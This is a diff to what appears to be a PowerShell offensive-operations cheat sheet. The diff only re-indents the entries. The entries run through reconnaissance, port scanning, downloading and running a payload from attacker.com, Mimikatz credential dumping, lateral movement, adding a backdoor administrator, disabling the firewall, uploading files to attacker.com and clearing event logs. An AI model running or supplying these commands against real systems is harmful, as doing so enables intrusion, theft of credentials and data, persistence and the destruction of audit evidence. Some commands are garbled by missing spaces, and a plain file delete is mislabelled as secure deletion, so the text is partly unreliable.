@@ -2,67 +2,67 @@
 
 ### System Reconnaissance
 
- - Get-WmiObject -Class Win32_OperatingSystem (Enumerate System Information)
+    Get-WmiObject -Class Win32_OperatingSystem (Enumerate System Information)
 
- - Get-Service | Where-Object {$_.Status -eq "Running"} (Check for running services)
+    Get-Service | Where-Object {$_.Status -eq "Running"} (Check for running services)
 
- - Get-NetIPConfiguration (Get current network configuration)
+    Get-NetIPConfiguration (Get current network configuration)
 
 ### User and Group Enumeration
 
- - Get-LocalUser (List local users)
+    Get-LocalUser (List local users)
 
- - quser (List user sessions)
+    quser (List user sessions)
 
- - Get-LocalGroup (List local groups)
+    Get-LocalGroup (List local groups)
 
- - Get-LocalGroupMember -Group "Administrators" (List group members)
+    Get-LocalGroupMember -Group "Administrators" (List group members)
 
 ### Network Scanning
 
- - Test-Connection IP -Count 1 -Quiet (Discover live systems)
+    Test-Connection IP -Count 1 -Quiet (Discover live systems)
 
- - 1..1024 | % {echo ((new-objectNet.Sockets.TcpClient).Connect("192.168.1.1", $_)) "Port$_ is open"} (Scan for open ports)
+    1..1024 | % {echo ((new-objectNet.Sockets.TcpClient).Connect("192.168.1.1", $_)) "Port$_ is open"} (Scan for open ports)
 
 ### Exploitation
 
- - IEX (New-ObjectNet.WebClient).DownloadString('http://attacker.com/payload.ps1') (Download and execute a payload)
+    IEX (New-ObjectNet.WebClient).DownloadString('http://attacker.com/payload.ps1') (Download and execute a payload)
 
 ### File and Directory Manipulation
 
- - Get-ChildItem -Recurse | Select-String -Pattern"password" (Search for files with sensitive data)
+    Get-ChildItem -Recurse | Select-String -Pattern"password" (Search for files with sensitive data)
 
- - (Get-Item "secret.txt").Delete() (Securely delete a file)
+    (Get-Item "secret.txt").Delete() (Securely delete a file)
 
 ### Credential Harvesting
 
- - Import-Module Mimikatz.ps1
+    Import-Module Mimikatz.ps1
 
- - Invoke-Mimikatz -DumpCreds (Dump credentials from memory)
+    Invoke-Mimikatz -DumpCreds (Dump credentials from memory)
 
 ### Privilege Escalation
 
- - ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator") (Check for admin privileges)
+    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator") (Check for admin privileges)
 
 ### Lateral Movement
 
- - Invoke-Command -ComputerName TARGET_IP ScriptBlock {COMMAND} -credential (Get-Credential)
+    Invoke-Command -ComputerName TARGET_IP ScriptBlock {COMMAND} -credential (Get-Credential)
 
 ### Post Exploitation
 
- - net user /add USERNAME PASSWORD (Add a backdoor user)
+    net user /add USERNAME PASSWORD (Add a backdoor user)
 
- - Net Localgroup Administrators USERNAME /add (Add your backdoor user to local administrators group)
+    Net Localgroup Administrators USERNAME /add (Add your backdoor user to local administrators group)
 
 ### Defensive Evasion
 
- - Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False (Disable Firewall)
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False (Disable Firewall)
 
 ### Data Exfiltration
 
- - (New-Object System.Net.WebClient).UploadFile("http://attacker.com/upload", "C:\path\to\data.txt") (Send data to attacking machine)
+    (New-Object System.Net.WebClient).UploadFile("http://attacker.com/upload", "C:\path\to\data.txt") (Send data to attacking machine)
 
 ### Log Management
 
- - wevtutil cl System (Clear event logs)
+    wevtutil cl System (Clear event logs)
 
